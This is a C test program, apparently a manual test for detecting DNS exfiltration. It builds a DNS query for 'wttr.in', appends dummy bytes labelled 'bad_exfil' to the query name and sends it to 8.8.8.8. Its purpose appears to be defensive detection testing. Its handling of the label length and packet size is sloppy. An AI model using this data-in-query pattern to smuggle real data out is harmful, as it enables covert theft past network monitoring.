// gcc -g test/manual/dns_detection.c -o dnsd

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define MAX_BUFFER_SIZE 1024
#define DNS_SERVICE "8.8.8.8"
#define DNS_PORT 53
#define QNAME "\004wttr\002in"

// DNS full header definition per RFC 1035
/*
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

Question Field
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QNAME                      |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QTYPE                      |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QCLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

 */

struct dns_header
{
    unsigned short id; // identification number
    unsigned char qr :1;     // query/response flag
    unsigned char opcode :4; // purpose of message
    unsigned char aa :1;     // authoritative answer
    unsigned char tc :1;     // truncated message
    unsigned char rd :1;     // recursion desired

    unsigned char ra :1;     // recursion available
    unsigned char z :1;      // its z! reserved
    unsigned char rcode :4;  // response code
    unsigned char cd :1;     // checking disabled
    unsigned char ad :1;     // authenticated data
 
    unsigned short qdcount;  // number of question entries
    unsigned short ancount;  // number of answer entries
    unsigned short nscount;  // number of authority entries
    unsigned short arcount;  // number of resource entries
};

typedef struct dns_query_t {
    struct dns_header qhead;
    unsigned char name[];
} dns_query;

typedef struct question_t
{
    unsigned short qtype;
    unsigned short qclass;
} question;

int
main (int argc, char *argv[])
{
    int sockfd;
    int qlen;
    char *qname;
    unsigned char bad_exfil[8] = {0x12,0x34,0x56,0x78,0x9a,0x9b,0x9c,0x0};
    struct sockaddr_in serverAddr;
    struct dns_header *dnsq = NULL;
    char buffer[MAX_BUFFER_SIZE];

    // Point to the buffer
    dnsq = (struct dns_header *)buffer;

    dnsq->id = (unsigned short) htons(getpid());
    dnsq->qr = 0;     // A query
    dnsq->opcode = 0; // A standard query
    dnsq->aa = 0;     // Not Authoritative
    dnsq->tc = 0;     // Message is not truncated
    dnsq->rd = 1;     // Recursion Requested
    dnsq->ra = 0;     // Defined by the server
    dnsq->z = 0;
    dnsq->ad = 0;
    dnsq->cd = 0;
    dnsq->rcode = 0;
    dnsq->qdcount = htons(1); // 1 question
    dnsq->ancount = 0;
    dnsq->nscount = 0;
    dnsq->arcount = 0;

    // End of the DNS header where the question section starts
    qname =(char *)&buffer[sizeof(struct dns_header)];
    snprintf(qname, sizeof(QNAME), QNAME);
    strcat(qname, bad_exfil);

    question *qinfo = (question *)(qname + strlen(qname) + 1);
    qinfo->qtype = htons(1);   // type A
    qinfo->qclass = htons(1);  // class IN

    qlen = (int)(qname - buffer) + sizeof(question);

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Initialize server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DNS_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(DNS_SERVICE);

    // Send the data
    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("sendto");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query to %s for %s\n", DNS_SERVICE, qname);

    // Close the socket
    close(sockfd);

    exit(0);
}
